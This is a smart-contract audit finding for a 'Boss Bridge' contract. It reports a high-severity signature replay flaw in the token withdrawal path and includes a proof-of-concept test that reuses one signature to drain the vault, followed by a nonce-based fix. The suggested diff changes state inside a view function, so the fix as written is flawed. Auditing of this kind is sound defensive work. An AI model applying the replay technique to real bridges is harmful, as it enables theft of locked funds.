# BOSS BRIDGE AUDIT REPORTS

# High

# [H-1] Signature replay attack at `L1BossBridge::sendToL1`

**Description:** Message signing do not contain single-use mechanism such `nonce` or `deadlines`. Hence, signatures can be used `n` number of times in order to execute `messages`.

**Impact:** Transfer signed by Signers can be executed by anyone effectively sending or withdrawing `n` number of times identical transaction as long as `L1BossBridge` owns or manages enough `L1Tokens` on `L1Vault`.

**Proof of Concept**

- Signatures are not one-usage and there's no mechanism from L1 to determine that user locked and unlocked tokens;

```javascript
   function testSignatureReplayAttacks() public {
        uint256 amount = 1 ether;

        uint256 vaultInitialBalance = 100e18;
        uint256 userInitialBalance = token.balanceOf(user);
        deal(address(token), address(vault), vaultInitialBalance);

        (uint8 v, bytes32 r, bytes32 s) = _signMessage(
            _getTokenWithdrawalMessage(user, amount),
            operator.key
        );

        while (token.balanceOf(address(vault)) > 0) {
            tokenBridge.withdrawTokensToL1(user, amount, v, r, s);
        }

        uint256 userEndingBalance = token.balanceOf(user);
        uint256 vaultEndingBalance = token.balanceOf(address(vault));

        assertEq(userEndingBalance, vaultInitialBalance + userInitialBalance);
        assertEq(vaultEndingBalance, 0);
    }
```

**Recommended Mitigation**

- usage of nonces to enable one-usage signatures
- usage of deadlines to allow signature validity within a time range.

```diff
    function _getTokenWithdrawalMessage(
        address recipient,
        uint256 amount
    ) private view returns (bytes memory) {
+       nonce += 1;
        return
            abi.encode(
+               nonce,
                address(token), // target
                0, // value
                abi.encodeCall(
                    IERC20.transferFrom,
                    (address(vault), recipient, amount)
                ) // data
            );
    }
```
